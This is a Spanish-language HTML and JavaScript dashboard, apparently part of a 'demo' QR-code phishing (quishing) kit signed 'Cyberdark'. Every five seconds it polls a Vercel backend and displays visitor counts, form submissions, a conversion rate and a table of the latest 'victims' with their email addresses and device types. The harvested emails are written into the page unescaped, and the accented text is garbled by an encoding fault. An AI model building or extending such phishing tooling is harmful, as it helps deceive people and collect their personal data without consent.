<!DOCTYPE html>
<html>
<head>
    <title>Demo Stats - Live</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
        .container { max-width: 900px; margin: auto; }
        .stat-box { 
            background: #ffffff; 
            padding: 20px; 
            margin: 15px 0; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .number { font-size: 2.2em; color: #e74c3c; font-weight: bold; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
        th { background-color: #f2f2f2; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Demo QRphishing - Estad√≠sticas en Vivo</h1>
        
        <div class="stat-box">
            <h2>üìä Resumen</h2>
            <p>Visitantes totales: <span class="number" id="totalVisits">0</span></p>
            <p>Formularios enviados: <span class="number" id="totalSubmissions">0</span></p>
            <p>Tasa de conversi√≥n: <span class="number" id="conversionRate">0.0%</span></p>
        </div>
        
        <div class="stat-box">
            <h2>üì± √öltimas V√≠ctimas (Las 10 m√°s recientes)</h2>
            <table>
                <thead>
                    <tr>
                        <th>Hora</th>
                        <th>Email</th>
                        <th>Dispositivo</th>
                    </tr>
                </thead>
                <tbody id="submissionsTableBody">
                    </tbody>
            </table>
        </div>
        
        <p><em>By Cyberdark</em></p>
    </div>

    <script>
    // URL de tu API de Vercel donde obtendremos las estad√≠sticas
    const API_URL = 'https://quishing-ashy.vercel.app/api/get-stats';

    // Funci√≥n para obtener los datos m√°s recientes del backend
    async function fetchStats() {
        try {
            const response = await fetch(API_URL);
            if (!response.ok) {
                throw new Error(`Error al contactar el servidor: ${response.statusText}`);
            }
            const data = await response.json();
            updateDashboard(data);
        } catch (error) {
            console.error("No se pudieron obtener las estad√≠sticas:", error);
            const tableBody = document.getElementById('submissionsTableBody');
            tableBody.innerHTML = `<tr><td colspan="3" style="text-align:center; color:red;">Error al cargar los datos en vivo. Aseg√∫rate de que el backend est√© funcionando.</td></tr>`;
        }
    }

    // Funci√≥n para actualizar la interfaz con los nuevos datos
    function updateDashboard(data) {
        // Asumiendo que tu API devuelve un objeto como: { totalVisits: 50, totalSubmissions: 10, latestSubmissions: [...] }
        const { totalVisits, totalSubmissions, latestSubmissions } = data;

        // Calcular estad√≠sticas
        const conversion = totalVisits > 0 ? (totalSubmissions / totalVisits * 100) : 0;

        // Actualizar el resumen
        document.getElementById('totalVisits').textContent = totalVisits || 0;
        document.getElementById('totalSubmissions').textContent = totalSubmissions || 0;
        document.getElementById('conversionRate').textContent = `${conversion.toFixed(1)}%`;

        // Actualizar la tabla de v√≠ctimas
        const tableBody = document.getElementById('submissionsTableBody');
        tableBody.innerHTML = ''; // Limpiar la tabla

        if (!latestSubmissions || latestSubmissions.length === 0) {
            tableBody.innerHTML = '<tr><td colspan="3" style="text-align:center;">A√∫n no hay datos enviados.</td></tr>';
        } else {
            // Tomar las √∫ltimas 10 (asumiendo que el backend ya las devuelve ordenadas)
            for (const submission of latestSubmissions) {
                const row = document.createElement('tr');
                
                const time = new Date(submission.timestamp).toLocaleTimeString('es-ES', {
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                
                const email = submission.email;
                const device = submission.device_info ? submission.device_info.deviceType : 'Desconocido';

                row.innerHTML = `<td>${time}</td><td>${email}</td><td>${device}</td>`;
                tableBody.appendChild(row);
            }
        }
    }

    // Llama a la funci√≥n cuando la p√°gina cargue
    window.onload = fetchStats;

    // Actualiza las estad√≠sticas cada 5 segundos
    setInterval(fetchStats, 5000);
</script>
</body>
</html>